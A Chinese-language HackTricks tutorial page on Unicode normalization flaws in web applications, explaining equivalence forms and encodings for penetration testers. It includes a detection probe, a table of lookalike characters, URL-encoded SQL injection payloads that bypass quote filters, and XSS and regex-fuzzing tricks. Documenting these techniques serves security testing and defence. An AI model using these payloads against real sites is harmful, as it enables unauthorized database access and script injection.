# Unicode规范化

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 背景

规范化确保可能使用不同的二进制表示形式的字符串在规范化后具有相同的二进制值。

字符之间有两种等价关系，即“**规范等价**”和“**兼容等价**”：\
**规范等价**字符在打印或显示时被认为具有相同的外观和含义。**兼容等价**是一种较弱的等价关系，因为两个值可能表示相同的抽象字符，但可以以不同的方式显示。**Unicode**标准定义了**4种规范化算法**，即**NFC、NFD、NFKC和NFKD**，每种算法以不同的方式应用规范和兼容规范化技术。您可以在Unicode.org上了解更多不同技术的信息。

### Unicode编码

尽管Unicode在一定程度上是为了解决互操作性问题而设计的，但标准的演变、支持旧系统的需求以及不同的编码方法仍然可能带来挑战。\
在我们深入研究Unicode攻击之前，以下是关于Unicode的主要要点：

* 每个字符或符号都映射到一个称为“代码点”的数值。
* 代码点值（因此也是字符本身）在内存中由1个或多个字节表示。像英语国家使用的LATIN-1字符可以使用1个字节表示。其他语言有更多的字符，需要更多的字节来表示所有不同的代码点（还因为它们不能使用LATIN-1已经使用的代码点）。
* “编码”一词表示字符被表示为一系列字节的方法。最常见的编码标准是UTF-8，使用此编码方案，ASCII字符可以使用1个字节表示，其他字符可以使用最多4个字节表示。
* 当系统处理数据时，需要知道用于将字节流转换为字符的编码方式。
* 尽管UTF-8是最常见的编码方式，但还有类似的编码标准称为UTF-16和UTF-32，每种编码方式使用的字节数不同。例如，UTF-16使用至少2个字节（但最多4个字节），UTF-32对所有字符使用4个字节。

下面是一个演示Unicode如何规范化表示两个不同字节的相同字符的示例：

![](<../../.gitbook/assets/image (156).png>)

**可以在此处找到一份Unicode等价字符列表：**[https://appcheck-ng.com/wp-content/uploads/unicode\_normalization.html](https://appcheck-ng.com/wp-content/uploads/unicode\_normalization.html) 和 [https://0xacb.com/normalization\_table](https://0xacb.com/normalization\_table)

### 发现

如果您可以在Web应用程序中找到一个被回显的值，您可以尝试发送**“KELVIN SIGN”（U+0212A）**，它在**规范化后变为“K”**（可以发送为`%e2%84%aa`）。**如果回显了“K”**，则可能正在执行某种**Unicode规范化**。

其他**示例**：`%F0%9D%95%83%E2%85%87%F0%9D%99%A4%F0%9D%93%83%E2%85%88%F0%9D%94%B0%F0%9D%94%A5%F0%9D%99%96%F0%9D%93%83` 经过**Unicode**规范化后为`Leonishan`。

## **存在漏洞的示例**

### **SQL注入过滤器绕过**

想象一个网页，它使用字符`'`来使用用户输入创建SQL查询。为了安全起见，该网页会从用户输入中**删除**所有出现的字符**`'`**，但在删除之后，**在创建查询之前**，它会使用**Unicode**对用户输入进行**规范化**。

然后，恶意用户可以插入一个等价于`' (0x27)`的不同Unicode字符，如`%ef%bc%87`，当输入被规范化时，会创建一个单引号，从而出现**SQL注入漏洞**：

![](<../../.gitbook/assets/image (157) (1).png>)

**一些有趣的Unicode字符**

* `o` -- %e1%b4%bc
* `r` -- %e1%b4%bf
* `1` -- %c2%b9
* `=` -- %e2%81%bc
* `/` -- %ef%bc%8f
* `-`-- %ef%b9%a3
* `#`-- %ef%b9%9f
* `*`-- %ef%b9%a1
* `'` -- %ef%bc%87
* `"` -- %ef%bc%82
* `|` -- %ef%bd%9c
```
' or 1=1-- -
%ef%bc%87+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3

" or 1=1-- -
%ef%bc%82+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3

' || 1==1//
%ef%bc%87+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f

" || 1==1//
%ef%bc%82+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f
```
#### sqlmap模板

{% embed url="https://github.com/carlospolop/sqlmap_to_unicode_template" %}

### XSS（跨站脚本攻击）

您可以使用以下字符来欺骗Web应用程序并利用XSS：

![](<../../.gitbook/assets/image (312) (1).png>)

请注意，例如，第一个Unicode字符可以发送为：`%e2%89%ae`或`%u226e`

![](<../../.gitbook/assets/image (215) (1).png>)

### 模糊正则表达式

当后端使用正则表达式检查用户输入时，可能会出现以下情况：输入被用于正则表达式的规范化，但在使用它的地方没有规范化。例如，在开放重定向或SSRF中，正则表达式可能会对发送的URL进行规范化，但然后按原样访问它。

工具[**recollapse**](https://github.com/0xacb/recollapse)允许生成输入的变体以模糊后端。有关更多信息，请查看**github**和此[**文章**](https://0xacb.com/2022/11/21/recollapse/)。

## 参考资料

**本页面的所有信息均来自：** [**https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/#**](https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/)

**其他参考资料：**

* [**https://labs.spotify.com/2013/06/18/creative-usernames/**](https://labs.spotify.com/2013/06/18/creative-usernames/)
* [**https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work**](https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work)
* [**https://jlajara.gitlab.io/posts/2020/02/19/Bypass\_WAF\_Unicode.html**](https://jlajara.gitlab.io/posts/2020/02/19/Bypass\_WAF\_Unicode.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的公司广告吗？或者您想获得PEASS的最新版本或下载PDF格式的HackTricks吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>
